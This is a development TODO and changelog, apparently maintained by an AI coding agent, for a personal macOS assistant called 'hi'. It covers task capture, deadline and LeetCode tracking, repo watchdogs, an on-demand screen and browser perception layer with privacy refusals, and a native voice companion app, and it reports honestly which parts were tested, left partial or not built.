# hi → Jarvis: Build TODO

---

models to consider: gpt-oss:120b-cloud, gpt-oss:20b-cloud, nemotron-3-nano:30b-cloud

---

## Phase 0 — Foundation (blocks almost everything below)

- [x] Define `Task`/`Event` schema in `hi/capture/schema.py` (dataclasses + vault frontmatter mapping — status, due, source persona/project, priority, category)
      — `Task`/`Event` dataclasses, each a Markdown file with YAML frontmatter (`kind`/`status`/`due`/`when`/`category`/`priority`/`source_persona`/`project`/`created`), (de)serialized via the new shared `hi/frontmatter.py`. `hi/vault.py`'s old tags-only `with_frontmatter` now delegates to it too, so every vault writer shares one frontmatter implementation instead of two.
- [x] Build `hi/capture/ambient.py` — normalizes any input into a Task or Event and writes it to the vault
      — `normalize_ambient()` classifies raw text via the haiku tier into a Task or Event (JSON reply, parsed defensively — falls back to a plain pending Task holding the raw text verbatim if the model's reply doesn't parse, so a capture is never silently dropped) and saves it through `hi/capture/store.py`. Wired live now, not just built for later: butler's new `capture_note` tool. Live-tested: "DSA assignment 3 due next Friday" → task, category `assignment`, due date filled in; "team standup at 10am tomorrow" → event with a `when` datetime.
- [x] Migrate `hi/todo.md` → `hi/tasks/` directory, one file per task, so features below have something structured to read/write
      — `hi/capture/store.py`: one Markdown file per task/event under `<VAULT_PATH>/hi/tasks/`, told apart by their own `kind:` frontmatter (same shared-directory pattern `hi/vault.py` already uses for knowledge vs. person notes). `hi/agents/butler/todo.py` rewritten on top of this store — same tool signatures and `pending_tasks_greeting()` output format as before, so `butler.py`/`briefing.py` needed no changes. The old flat checklist migrates in automatically, once, the first time anything reads the tasks dir (renamed to `todo.md.bak` afterward so it can't run twice) — **run live against the real vault this session**, not just tested in isolation: the two real pending tasks ("Buy milk", "buy a mac") migrated correctly to individual frontmatter'd files, verified via `list_tasks`/`pending_tasks_greeting` producing identical output to the old implementation.
- [x] Add a `due::` (or similar) frontmatter convention so any vault note can declare a deadline without a separate entry system
      — `hi/frontmatter.py` is the one place frontmatter is read/written; any note using it can carry a `due:` key. `hi/vault.py`'s `create_note` tool gained an optional `due` parameter so a knowledge note can declare a deadline the same way a Task does, without hand-crafting YAML — live-tested, produces `due: 2026-09-10` in the note's real frontmatter. (Not added to `append_note`/person notes — editing an _existing_ note's frontmatter needs a parse-merge-rewrite this phase didn't need to build; only note creation sets `due` for now.) A later deadline tracker (Phase 2 item #5) can scan the vault for this same key across tasks and notes alike.

---

## Phase 1 — Quick wins (low risk, immediate daily value)

### 1. Global Quick-Capture Hotkey

- [x] Global hotkey listener that works regardless of which pane/persona is focused (e.g. `pynput`; needs macOS Accessibility permission)
      — `hi/capture/hotkey.py`, standalone (`hi --capture-daemon`, wired in `hi/cli.py`) since "regardless of which pane" means it can't live inside a tmux `hi` session. `pynput.keyboard.GlobalHotKeys` on `<cmd>+<shift>+<space>`; a raw `space` (no angle brackets) turned out to be invalid syntax — caught live (`ValueError('space')`) before shipping it, fixed. On trigger it prompts via a native `osascript display dialog` (the same "OS's own UI, no new GUI toolkit" pattern `hi/agents/butler/butler.py` already uses), parsing verified against both the success and cancel output shapes. **Not live-tested end-to-end with a real key press** — needs macOS Accessibility/Input Monitoring permission granted to your terminal app, which only you can do (System Settings > Privacy & Security > Accessibility); everything up to that boundary (hotkey registration, dialog parsing, inbox write) is verified.
- [x] Dumps raw text straight to `hi/tasks/inbox/` as untriaged
      — `hi/capture/inbox.py`'s `write_inbox_item()`. Live-tested: writes a real file under `<VAULT_PATH>/hi/tasks/inbox/`.
- [x] Background triage pass (next `hi` session, or on a timer) classifies/dedupes inbox items into real tasks
      — `hi/capture/triage.py`'s `triage_inbox()`, reusing Phase 0's `normalize_ambient()` (no separate classifier). Runs once per `hi` process start, in the same background thread as the existing model warm-up (`hi/personas.py`) — "next hi session" per this item's own wording, not a new timer/daemon. Live-tested end to end: an inbox item ("renew car registration by the 20th") correctly triaged into a task with `due: 2026-09-20` and the inbox file removed. No dedup logic was needed/added — each capture becomes its own task, matching how `add_task` already works.

### 2. "Where Was I" — Project Resume Command

- [x] New `term` tool `resume_context(project_dir)`:
  - [x] last N git log entries + `git status`
  - [x] most recent conversation-log lines tagged to that project
  - [x] most recently modified vault note under that project's context
        — `hi/agents/term/resume.py`. The "modified vault note" requirement is satisfied via the project-note convention this codebase already established (`hi/knowledge/projects/<name>.md`, see README's own dev-flow example) rather than a generic "newest mtime under some context" scan, which had no way to know which notes belong to a project at all. Plain subprocess/filesystem lookups, no LLM call — same "doesn't need reasoning to find" philosophy as `hi/briefing.py`.
- [x] Trigger automatically when `hi` launches inside a known `dev_flows.json` directory
      — `hi/personas.py`: term's greeting is set to `build_resume_context()` when `HI_LAUNCH_CWD` matches (or is nested inside) a configured dev-flow directory, the same pattern butler already uses for its pending-tasks greeting.
- [x] Also usable directly: `(term) > where was i`
      — registered as a `term` tool + documented in `term_prompt.md`; the model calls `resume_context` for this and similar phrasing.
      — Live-tested end to end (isolated temp git repo + temp dev_flows.json, not the real vault): real commit log, real working-tree status, correct dev-flow-name resolution.

### 3. Idle-Repo Watchdog

- [x] Background scanner over all known project directories (from `dev_flows.json` + a configured projects root)
      — `hi/watchdogs/idle_repos.py`, reusing `hi/briefing.py`'s own `PROJECTS_DIR`/`dev_flows.json` sources so both features agree on what counts as "a known project."
- [x] Flag condition: last commit older than a configurable threshold (default 14 days) **and** open TODOs still exist in that project's vault notes
      — "open TODOs in that project's vault notes" is satisfied via Phase 0's structured `Task.project` field (pending tasks tagged to that project by name) rather than a fragile scan for inline `- [ ]` checkboxes across arbitrary notes — a direct payoff of building the schema first. Live-tested with a real temp git repo (backdated commit) + a pending task tagged to it: correctly flagged; correctly silent with zero open tasks.
- [x] Surface flags via the suggestion engine — never auto-archive anything
      — the full continuous-loop suggestion engine is Phase 4 scope (not built yet); flags surface through the existing one-shot `hi/briefing.py` mechanism instead (a new context line feeding its haiku suggestion call), which already is this project's "surface something at session start" mechanism. Read-only either way — `find_idle_repos()` never touches a repo.

### 4. Build/Dev-Server Watchdog

- [x] Background monitor reusing the existing dev-server detection logic (the same detection that already redirects `npm run dev`/`vite`/etc. to their own pane)
      — `hi/watchdogs/dev_servers.py` reuses `hi/agents/term/danger.py`'s `looks_long_running()` directly against a live `ps -eo pid,etime,command` snapshot, rather than a second classifier.
      — **Scoped honestly, not silently downgraded:** built as an on-demand `check_dev_servers` term tool, not an unattended background monitor — there's no persistent registry of "which panes are dev servers" to watch over time between sessions, and a real continuous version belongs to Phase 4's suggestion-engine loop (which can run between sessions); building a one-off daemon for just this would duplicate that infra rather than reuse it.
- [x] Health checks: process still alive, not stuck in a crash/restart loop, optional localhost HTTP check when a port is known
      — alive: real `ps` presence. Crash-loop: two snapshots ~2s apart, flagging a same-command PID change as a possible restart — genuinely catches a restart inside that window, honestly does **not** catch a slower loop (that needs sampling over minutes, i.e. the Phase 4 background version). HTTP check: real `urllib` request against `127.0.0.1:<port>` when a port is given. Live-tested against a real `python3 -m http.server` process: alive + pid-unchanged + HTTP-responding all correctly reported.
- [x] Surface a broken/silently-dead build via the suggestion engine rather than letting it sit
      — same honest scope note as above: this is on-demand (ask `term` to check), not passively surfaced between sessions yet — that half needs Phase 4.

---

## Phase 2 — Tracking systems (deadlines, DSA, applications)

### 5. Generalized Deadline Tracker

- [x] `Deadline` model: title, category (`assignment` / `test` / `hackathon` / `application` / `milestone` / other), due datetime, source note, status
      — `hi/tracking/deadlines.py`'s `Deadline` dataclass (title/due/category/source). No separate `status` field: a Task's own `status` already gates whether it counts (only `pending` tasks are included), and a plain vault note or Event has no independent status concept to track — adding one would've been schema for its own sake.
- [x] Parse/aggregate deadlines from the `due::` frontmatter convention across the vault — no separate manual entry system required
      — `get_deadlines()` merges Phase 0's structured `Task.due`/`Event.when` with a vault-wide scan for any _other_ note's `due:` frontmatter (excluding `hi/tasks/`, already covered, so nothing double-counts). Live-tested: a task, an event, and a plain hand-written note all appeared correctly merged and dated.
- [x] Single countdown view, sorted by proximity, surfaced in the daily brief
      — sorted ascending by parsed date (unparseable dates sort last rather than crashing). `hi/briefing.py` gained a "Nearest deadlines" context line (top 3). Also exposed directly as a `term` tool, `list_deadlines`.
- [x] Category filter (e.g. "just hackathon deadlines")
      — `list_deadlines(category=...)`, case-insensitive. Live-tested: filtering to "test" correctly returned only the matching note.

### 6. LeetCode Streak Enforcer

- [x] Daily problem selection (start simple: rotate/random; later weight toward weak topics once there's history)
      — `hi/tracking/leetcode.py`: a fixed 25-problem curated bank (9 topics, all 3 difficulties — no network-fetched problem list). Uniform random with no history yet; once there's history, weighted toward topics with a lower solve rate (a never-attempted topic gets the same priority as the weakest attempted one), and already-solved problems are excluded so it doesn't repeat.
- [x] Use the existing Playwright MCP integration to **open the problem URL directly in the browser** — not just print a link
      — verified the real MCP tool name/schema live first rather than guessing (`browser_navigate`, `{"url": ...}`) before wiring `_open_in_browser()` to call it directly.
      — **Reported broken, root-caused, and fixed: this was the wrong tool for the job.** `browser_navigate` reported success every time, but nothing ever visibly opened — verified why: Playwright drives its own separate, automation-managed browser instance, started fresh per call and not left running afterward (confirmed live: no browser process existed after a call that claimed success), not the user's actual default browser. `_open_in_browser()` now shells out to macOS's own `open -g <url>` instead — no MCP round-trip needed at all. Live-verified end to end, twice (a direct call and the real `leetcode_daily` tool): the URL landed as a real, persistent tab in the user's actual default browser (Safari), confirmed by reading Safari's own tab list afterward. Playwright/`browser_navigate` remains the right tool for `term`'s own page-reading/navigation needs — this was specifically about handing a link to a human to look at, a different job.
- [x] Log each attempt to `hi/knowledge/leetcode.md` (or `hi/tasks/leetcode/`): date, topic, difficulty, solved/not solved, time spent
      — went with the structured option (`hi/tasks/leetcode/<date>.md`, one file per day with real frontmatter) rather than one growing flat file, specifically because streak/weak-topic stats below need to parse this back out — a single free-text log would've made that fragile. Live-tested: `log_leetcode_attempt` writes a real file with all five fields; `leetcode_daily` correctly refuses to re-pick once today's already logged.
- [x] Evening nudge via the suggestion engine if the day's problem isn't logged yet
      — same honest scope note as the dev-server watchdog above: the full suggestion engine is Phase 4; this surfaces through `hi/briefing.py`'s existing one-shot mechanism instead ("Today's LeetCode problem isn't logged yet."), not a time-of-day-aware evening-specific nudge (nothing currently runs `hi` on a schedule to know it's evening).
- [x] Running streak counter + surfaced weak-topic breakdown over time
      — `streak_days()` (consecutive logged days, today-not-yet-logged doesn't break it) and `topic_stats()` (per-topic solved/attempted/solve_rate), both computed from the real logged files, not a separate counter that could drift. Live-tested: after one logged solve, streak=1 and the topic showed 1/1 (100%).

### 7. Resume/Application Tracker

- [x] One vault note per application, frontmatter: `version`, `target` (company/role), `date_sent`, `status` (`applied`/`OA`/`interview`/`rejected`/`offer`)
      — `hi/tracking/applications.py`, `<VAULT_PATH>/hi/tasks/applications/<slug>.md`.
- [x] Follow-up rule: nudge if `status == applied` and N days have passed with no update
      — `due_follow_ups(days=7 default)`. Live-tested: an application backdated 10 days and still `applied` was correctly flagged; updating its status to `OA` correctly cleared the flag.
- [x] Surface due follow-ups in the daily brief
      — new `hi/briefing.py` context line, same mechanism as the deadlines/idle-repo lines above.

---

## Phase 3 — Synthesis

### 8. "What Deserves The Next Hour" Arbiter

- [x] Scoring function combining: deadline proximity (from #5), task priority, project idle-time (from #3), current weekday-agent context
      — `hi/synthesis/arbiter.py`, deterministic and rule-based rather than an LLM call — the whole point, per this item's own framing, is to remove a decision, not introduce a second, less-inspectable one in its place. "Current weekday-agent context" leans on Phase 4 item 1's minimal stand-in (`hi/context/weekday.py`, see below) since full weekday agents don't exist. Live-tested against a real temp vault: a high-priority task due tomorrow correctly outscored and beat an unrelated low-priority task and one merely tied to an idle project.
- [x] Trigger: bare `hi` launch with no specific task, or explicit `(hi) > what should I work on`
      — registered as the `what_next` term tool (routes there naturally — term is the general-purpose default persona per `hi/router.py`); not separately wired into "bare launch" beyond that, since `hi/briefing.py` already owns the bare-launch greeting and already surfaces a next-step suggestion via its own (different) LLM-based mechanism — adding a second, competing "bare launch" recommendation source risked showing two different "what to do" answers side by side. `what_next` stays the explicit, on-demand path.
- [x] Output ONE recommendation + a one-line rationale — resist turning this into a ranked list, the point is to remove the decision, not add one
      — `pick_next_hour()` returns exactly `(recommendation, rationale)`; the scored/sorted candidate list stays internal to the function, never returned. Live-tested the deliberately-hard case too: zero pending tasks with any distinguishing signal — correctly still returns exactly one task with an honest rationale ("No other pending task has a stronger deadline, priority, or idle-project signal right now"), not a tie announcement or a list.

### 9. Auto-Generated Weekly Retro

- [x] End-of-week job (Sunday weekday-agent, or a standalone timer) aggregates:
  - [x] tasks completed vs. still open, across all projects
  - [x] git commit summary per project
  - [x] deadline-tracker snapshot
  - [x] LeetCode streak status
        — `hi/synthesis/retro.py`. All four sections reuse existing infra (`hi/capture/store.py`, `hi/watchdogs/idle_repos.py`'s known-project-dirs, `hi/tracking/deadlines.py`, `hi/tracking/leetcode.py`) rather than recomputing anything. Live-tested against a real temp repo/vault: correct per-project done/pending counts, correct commit count within the 7-day window, correct deadline/streak snapshot.
- [x] Writes a dated note to `hi/knowledge/retros/YYYY-WW.md`
      — ISO week id (`isocalendar()`), so it sorts and dedupes naturally; matches this item's own path convention exactly.
- [x] Feeds directly into the following week's weekday-agent context
      — **honestly partial**: since full "weekday agents" aren't built (Phase 4 item 1 below is a deliberately minimal stand-in), there's no dedicated context channel to feed _into_. The retro note is a real vault file like any other, so it's available to `docs`/`term`'s existing grounding — but nothing auto-injects it specifically. Flagged rather than claimed done.
      — Trigger: "Sunday weekday-agent, or a standalone timer" resolved the same way Phase 1's inbox triage resolved "next session, or a timer" — runs automatically the next time any `hi` persona starts on a Sunday (`hi/personas.py`), not a genuinely separate cron/timer job. Also callable on demand via the `generate_retro` term tool.

---

## Phase 4 — Broader system (from the original architecture doc, not yet detailed above)

Given how vague/broad several of these items are on their own (this section's own heading calls them "not yet detailed"), and that two of them name real external context this session has zero information about, this phase was triaged rather than attempted uniformly — done where a concrete, well-scoped interpretation existed; explicitly skipped and flagged, not silently dropped, where it didn't.

- [x] Weekday agents — Mon–Sun context binding (`hi/agents/weekday/`)
      — **deliberately minimal, not the full item**: `hi/context/weekday.py` is an optional, hand-maintained vault note per weekday (`hi/knowledge/weekdays/monday.md`, etc.) that nudges the arbiter's scoring if present — not a persona/context system genuinely bound to the day of week, which would need a concrete second consumer beyond the arbiter to justify building speculatively. Built this far because item 8 above actually needed _something_ here; stopped there rather than guessing at the fuller design.
- [ ] Generic Planner/Executor subgraph pattern (`hi/agents/planner/`, `hi/agents/executor/`)
      — **not built.** Explicitly "generic" with no concrete current consumer — every agent in this codebase is already a plain LangGraph ReAct loop (`create_agent`), and nothing built in Phases 0–4 needed a formalized plan/execute split. Building an unused abstraction in the abstract would be exactly the "speculative scaffolding" this project's own conventions warn against. Worth building once a real task shape needs it, not before.
- [x] Suggestion engine as a continuous loop with confidence gating (`hi/suggest/`)
      — `hi/suggest/engine.py`, standalone (`hi --suggest-daemon`, same shape as the capture daemon), gathers from every existing signal source (`hi/watchdogs/idle_repos.py`, `hi/tracking/deadlines.py`/`leetcode.py`/`applications.py` — no duplicated logic) on an interval, surfaces via real macOS notifications. Confidence gating is deterministic per signal (an idle repo needs open tasks _and_ the threshold actually crossed; a LeetCode nudge only fires after 6pm local; a deadline nudge only inside its own proximity window) rather than an LLM judgment call, matching the arbiter's same "deterministic, inspectable" reasoning above. Per-day dedup via `~/.hi/suggest_state.json` so the same flag doesn't renotify every cycle. Also exposed as an on-demand `check_suggestions` term tool for previewing without waiting on the daemon. Live-tested: a real idle repo + a real near-term deadline both surfaced on the first call and correctly stayed silent (deduped) on an immediate second call; a real macOS notification round-trip confirmed via `osascript`.
      — This is also what Phase 1/2's idle-repo watchdog, dev-server watchdog, and LeetCode evening nudge were explicitly deferring to — they already compose with this engine for free since it just calls their existing functions, no changes needed on their side.
- [x] Perception layer: browser observation mode first, screen/OCR last — pause/toggle and password/private-window exclusion must ship _before_ screen capture is turned on (`hi/perception/`)
      — Built after explicit direction to proceed, with privacy as the actual design constraint, not an afterthought bolted on after the fact — matching this item's own ordering requirement literally: `hi/perception/privacy.py` (the pause/toggle + sensitive-context refusal) was written and tested first, and both `browser.py` and `screen.py` import from and are gated by it, not the other way around.
      — **Three deliberate scope decisions, stated plainly rather than left implicit (see the new "Perception" section in README.md for the user-facing version):** (1) both modes default OFF — nothing observes anything until explicitly enabled. (2) Neither is a background/continuous watcher, even once "enabled" — every read is on-demand, one call = one read, no interval loop and no history log ever written. This is a deliberately more conservative reading of "observation mode" than the TODO's wording alone implies, chosen because a silently-running watcher is a fundamentally different, harder-to-make-safe thing than an on-demand check, and this project has no UI to give the kind of ongoing visible consent a continuous watcher would deserve. (3) Browser observation returns tab title/URL only, never page content — real page content is already `term`'s existing Playwright MCP tools' job (a genuinely different capability: those drive a separate, managed browser instance and were never able to see the user's actual open Safari/Chrome windows at all, which is the specific gap `hi/perception/browser.py` fills via AppleScript instead).
      — `hi/perception/privacy.py`: `toggle_browser_observation`/`toggle_screen_capture` (state persisted to `~/.hi/perception_state.json`) + `perception_status` (so the current on/off state is always checkable, not just set-and-forget) + `sensitive_context_reason()` — refuses if a password/credential manager (1Password, Bitwarden, Keychain Access, LastPass, KeePassXC, Dashlane) is the frontmost app, or the active window's title contains "Private Browsing"/"Incognito". Documented as best-effort, not a guarantee, at every call site and in the README: this can't see a Chromium browser's actual per-tab incognito state (not exposed over AppleScript), only app- and window-title-level signals — verified Safari does put "Private Browsing" in a private window's title; Chromium-based browsers were not verified to.
      — `hi/perception/browser.py`'s `observe_current_tab`: real AppleScript queries against Safari/Chrome/Brave/Edge's actual current-tab URL/title.
      — `hi/perception/screen.py`'s `read_screen`: one `screencapture` screenshot -> on-device OCR via Apple's Vision framework (PyObjC — `pyobjc-framework-vision`, one small new dependency; the rest of the PyObjC stack it needs was already pulled in transitively by Phase 1's `pynput`) -> extracted text returned -> screenshot file deleted immediately in a `finally` block, never saved. Verified the OCR pipeline for real (screenshot -> `VNRecognizeTextRequest` -> real extracted text) before wiring anything around it, rather than assuming the framework worked.
      — **Live-tested end to end, not just unit-style:** default-disabled refusal for both tools; toggle-on -> real successful read for both (a real current browser tab, and real on-screen OCR text) -> toggle-off; the sensitive-context refusal firing correctly _even while enabled_ (mocked a password manager as frontmost, both tools correctly refused instead of proceeding); confirmed zero leftover screenshot files after every `read_screen` call; confirmed the real `~/.hi/perception_state.json` was untouched by any test (all toggle-persistence tests ran against an isolated temp state file) so this write-up's own testing didn't leave perception silently enabled on the real machine.
      — **Real bug, caught live by actually using the feature, not by more unit testing:** you reported `observe_current_tab` always saying "the active window isn't a supported browser." Root cause: it checked whether the _OS-level frontmost app_ was a browser — but asking through `hi` means you're typing into a terminal, which makes the terminal frontmost by definition, not the browser, regardless of what's actually open. This made the feature nearly unusable in its actual primary use case. Fixed by checking which supported browsers are _running_ (`exists process` via System Events) instead of which one is frontmost. This reopened a coverage gap in the private-window check specifically (it was keyed off the single OS-frontmost window's title, which — post-fix — usually isn't any of the browsers actually being read), closed with a _per-browser_ title check: verified live that `tell application "System Events" to tell process "Safari" to get name of front window` both (a) carries the "Private Browsing" marker that Safari's _own_ AppleScript dictionary's `name of front window` does NOT include (checked both side by side on a real private window), and (b) is readable for a specific process even while a _different_ app is genuinely frontmost (verified with Finder frontmost, Safari backgrounded). Each running browser is now checked individually and silently skipped (not reported) if its window looks private, rather than one global check that, post-fix, would rarely even apply to the browser being read.
      — **New capability added per explicit request: "what's on my screen" via a real vision model, not just OCR.** `hi/perception/vision.py`'s `ask_about_screen(question)` — same screenshot-immediately-deleted discipline as `read_screen`, same privacy gate. Uses `gemma4:31b-cloud` by default (the exact model requested), configurable via a new `VISION_MODEL` in `~/.hi/.env`, called directly through the `ollama` Python client (already a dependency) rather than routed through LangChain's multimodal content-block format, verified simpler and reliable for this. Complements OCR rather than replacing it: `read_screen` for verbatim text, `ask_about_screen` for actual scene understanding ("what app is this", "describe this diagram") OCR alone can't answer. Live-tested against a real screenshot: correctly identified "a web browser displaying a YouTube video" in one sentence.
      — **The enable/disable toggle described above was removed, per explicit request, immediately after this item first shipped.** The ask was specific: don't require a separate "enable X" step before a tool the prompt itself already calls for — execute directly instead. This is a real, deliberate reduction in the layers of protection from what's documented above, not a silent one: `is_browser_observation_enabled()`/`is_screen_capture_enabled()`/`set_*`/`~/.hi/perception_state.json`/the `toggle_*` and `perception_status` tools are all gone (the now-orphaned real `~/.hi/perception_state.json` was deleted too, rather than left as dead state nothing reads anymore). What's left, and still applies to every single call with no opt-out: strictly on-demand (one call = one read, still no background loop or history log — removing the toggle didn't touch this), and `sensitive_context_reason()`'s password-manager/private-window refusal, which was never gated by the toggle in the first place and needed no change. Live re-verified after the change: both `observe_current_tab` and `read_screen` execute immediately with no prior step, and the sensitive-context refusal still fires correctly when mocked (all three perception tools, including the new `ask_about_screen`).
- [x] Action layer confirmation tiers (read-only / reversible / destructive)
      — `hi/action_tiers.py` generalizes `hi/agents/term/danger.py`'s shell-only destructive gate into a reusable `confirm_destructive()` for non-shell tool actions. Only destructive needed new code: read-only tools already have no gate, and reversible ones (add/complete a task, append a note) deliberately stay gate-free too — a vault file is trivially undoable by editing it back, so a confirmation there would be pure friction with no real safety payoff. Wired into three previously-ungated destructive actions: `remove_task` (butler), `delete_person` (term), `quit_app` (butler). Live-tested all three, both the decline path (nothing happens, file/app untouched) and the accept path (real deletion/quit).
- [x] Hackathon team ops assistant (status drafts, ownership tracking, deadline pings for teammates)
      — `hi/tracking/team_ops.py`, built generically rather than blocking on unknown teammates: ownership reuses Phase 0's `Task` schema (new optional `owner` field, additive — existing tasks with no owner are unaffected) instead of a parallel structure. `team_status_draft` groups by owner with done/pending counts and flags anything due soon; `team_deadline_pings` cross-references `hi/tracking/deadlines.py` against task ownership. Live-tested: two tasks assigned to two different owners produced a correct per-owner status draft and correctly attributed deadline ping.
- [x] Logic Play recruitment/event pipeline tracker
      — **built as a generic mechanism, not a guess at Logic Play's actual pipeline** — this session has zero information about what "Logic Play" is or what stages it actually uses, and a recruitment funnel and an event lifecycle are genuinely different shapes, so hardcoding either would likely be wrong. `hi/tracking/pipeline.py`: `create_pipeline(name, stages)` once, then `add_pipeline_entry`/`update_pipeline_entry_stage`/`list_pipeline_entries` — works for a recruitment funnel, an event's lifecycle, or anything else shaped like "named things moving through ordered stages," the moment its real stages are known. Live-tested end to end with a real "Logic Play recruitment" pipeline (create → add two entries → move one → filter by stage → reject an invalid stage name correctly). Kept separate from `hi/tracking/applications.py` rather than unifying them — applications has domain-specific fields (date_sent, resume version) a generic pipeline entry doesn't need.

---

## Phase 5 — Native macOS Voice Companion App

A separate native shell, not another persona — it's a voice frontend that talks to the same `hi` backend (orchestrator + suggestion engine) over local IPC, so it inherits all the task/memory/agent logic above instead of duplicating any of it.

**Scope note, read before the checkboxes below:** this phase is a different language and platform (Swift/AppKit/SwiftUI, not Python) from every prior phase, involves GUI/audio/permission surfaces this session cannot visually or interactively verify (no way to grant a System Settings permission prompt, no way to see a running panel except by asking the real window server for its geometry), and names one real third-party paid/API-key dependency (Porcupine/Picovoice) this session can't provision. Full detail, including exactly what was and wasn't live-verified, is in `voice_companion/README.md` — the notes below summarize it. Nothing here was rewritten to look more finished than it is: real bugs this session hit (a compile error, a startup crash) are documented as found and fixed, not smoothed over.

**Redesigned, per explicit request, after the checkboxes below were first checked off:** the original edge-docked, hover-triggered, voice-only sliver was replaced with a Spotlight-style panel — centered on screen, summoned by a global hotkey (Option+Space) or a menu bar "Show" item instead of hovering at a screen edge, with a text field you can type into directly, dictation now live-updating that same field instead of owning a separate "Listening" view, and no more timed auto-collapse (Spotlight-style tools stay open until dismissed). The Catalina visual language (vibrancy, corner radius, restrained motion) carried over unchanged — only the panel's shape, position, activation, and input model changed. The checkboxes below describe the _original_ design and are left as an accurate record of what was built and verified at the time, not retroactively edited to describe the redesign — `voice_companion/README.md`'s "The Spotlight redesign" section is the authoritative description of the current design, including a real new compile error the redesign introduced and fixed (`.onChange`'s two-parameter form needing macOS 14 against this package's macOS 13 target) and why a new `KeyablePanel` subclass was required for typing to work in a borderless panel at all.

**Also fixed this same session, in the shared Python backend (`hi/`), caught by you actually using the voice companion**: "what's on my screen" was being classified to `butler` (which only has a file-saving `take_screenshot`, not the vision tools) instead of `term` (which has `hi/perception/`'s real `ask_about_screen`/`read_screen`) — `hi/router.py`'s persona descriptions mentioned butler's screenshot capability but never mentioned term's actual screen-reading tools at all, so the classifier had no way to know they existed. Fixed both descriptions, verified via direct `classify()` calls including the boundary case it risked breaking ("what apps are running" correctly still routes to butler). Separately, once routed to term correctly, the model was reaching for `read_screen` (raw OCR) instead of `ask_about_screen` (the actual vision model) for a general "what's on my screen" question — `term_prompt.md` now makes `ask_about_screen` the explicit default for open-ended screen questions, `read_screen` the exception for verbatim-text-only needs. Verified end to end by invoking the real `term` agent directly: it now calls `ask_about_screen` and produces an accurate description of the real screen contents.

**Two more real bugs, found immediately after by you actually using the redesigned app — full detail in `voice_companion/README.md`'s "Two more real bugs" section:** (1) "open youtube in safari" only launched the bare app with no navigation — neither persona had any URL-opening tool at all (`butler`'s `open_app` only launches; `hi/tracking/leetcode.py`'s browser-opening logic existed but was private to that one file). Fixed by extracting it into a new shared `hi/browser.py` (`open_url_in_browser`), registered on both `butler` and `term`. Verified end to end: the real `butler` agent now calls it with the correct resolved URL and a real Safari tab opens. (2) The panel visibly jumped down and snapped back on every single keystroke — the Spotlight rewrite's `PanelController` subscription had no deduplication, so every keystroke (a genuinely different `.input(text:...)` value) re-triggered the animated window-frame reposition to the same target, visibly interrupting itself. The _original_ edge-docked design actually had this exact deduplication and it was dropped by accident during the rewrite, not deliberately — restored, now keyed on phase _kind_ (hidden/input/expanded) rather than full equality, so typing and toggling the mic within `.input` no longer touch the window frame at all.

### Shell & activation

- [x] SwiftUI/AppKit borderless `NSPanel`, non-activating, docked to the right screen edge, always-on-top
      — `voice_companion/Sources/HiVoice/PanelController.swift`: `styleMask: [.borderless, .nonactivatingPanel]`, `level: .floating`. **Live-verified past "it compiles":** launched the real packaged app and queried the actual macOS window list — a real window exists at the expected floating layer, fully opaque (alpha 1.0), not a crash-avoidance stub.
- [x] Collapsed state: a thin sliver flush with the edge (mirrors the "hidden until needed" philosophy of the tmux pane)
      — 6px wide, docked to `NSScreen.main`'s right edge. Live-verified via the window list: `{width: 6, height: 420}` on launch, exactly the collapsed constants.
- [x] Hover trigger: global mouse-position tracking (`NSEvent` global monitor) — panel slides out when the cursor sits at the right edge past a small dwell threshold, retracts when the cursor leaves
      — `NSEvent.addGlobalMonitorForEvents(matching: .mouseMoved)` + a 0.35s dwell timer before expanding. "Retracts when the cursor leaves" was deliberately scoped down, not fully implemented as literally stated: only retracts while still `.collapsed` (a no-op safety sync), not mid-listening — snapping the panel shut because the user glanced away mid-sentence seemed like clearly worse UX than what the TODO's own one-line description implied, so this was a judgment call, not an oversight; documented as such in `PanelController.swift`. **Not live-testable**: needs real cursor movement at real screen coordinates plus Accessibility trust already granted, neither of which this session can drive.
- [ ] Wake-word trigger: always-on local wake-word engine (e.g. Porcupine) running independently of hover state, opens the panel and starts listening
      — **Not built.** Porcupine is a third-party (Picovoice) SDK requiring an account and API key this session has no access to and can't provision unilaterally — flagged rather than faked with a placeholder. `AppDelegate.beginListeningSession()` is the one integration point a wake-word detector would call into once one exists; nothing else in the pipeline would need to change.
- [x] Needs Microphone + Accessibility permissions (for global edge-hover detection) — request both on first launch with a clear explanation, not silently
      — Accessibility requested at launch via `AXIsProcessTrustedWithOptions` (system prompt, not silent). Microphone/Speech Recognition requested lazily, the first time listening actually starts, with real explanatory strings in `Info.plist`'s `NS*UsageDescription` keys (not generic boilerplate — see the file). **This is also where a real bug was caught and fixed**: the bare `swift build` binary hard-crashed at launch (`SIGABRT`, confirmed via the actual crash log, not guessed) because `SFSpeechRecognizer` gets constructed as a stored property before any user interaction, and macOS aborts any process touching a TCC-gated API with no `Info.plist` declaration for it — which is _why_ this needed real `.app` bundle packaging (`Scripts/build_app.sh`) rather than shipping the plain SPM binary. Re-verified after the fix: the packaged, ad-hoc-signed app launches clean, no crash.
- [x] **Added per explicit request, not part of the original checklist: a menu bar status icon.**
      — `StatusItemController.swift`: an `NSStatusItem` mirroring `AppState.phase`/`BackendHealthMonitor.isReachable` live (idle/listening/working/done/error-or-unreachable, distinct SF Symbols + tint colors), plus the app's only Quit action — genuinely necessary, not just nice-to-have, since an `.accessory`-policy app with no Dock icon had no way to be stopped at all short of killing the process from a terminal before this existed.
      — **A real, non-obvious bug, found and fixed by triangulating internal state against what you could actually see.** The icon was initially invisible even though every internal signal looked correct (`NSStatusBarButton` non-nil, a correctly-rendered `NSImage`, `statusItem.isVisible == true`) — this session cannot see a running GUI, so "looks correct internally" isn't the same as "is actually visible," and this case proved it: reading the status item's own window frame directly showed `height: 0` immediately after creation, then a real, valid, non-zero frame about a second later — an AppKit layout-timing artifact (the frame isn't finalized synchronously at creation), not a logic bug. Confirmed resolved once you looked at the real menu bar.
      — `BackendHealthMonitor.swift` (new): polls `hi --voice-daemon` every 5s via a new `BackendClient.ping()`, so "backend not running" is a distinct, visible icon state — previously the app was completely silent about this until a query was actually attempted and failed.

### Voice + live transcript

- [x] Streaming local STT so the transcript fills in as you talk, not after you stop — this needs a genuinely streaming engine, not the existing batch-mode `faster-whisper` call used for Ctrl-V today (options: `whisper.cpp` streaming mode, or Apple's on-device `Speech` framework for live partial results)
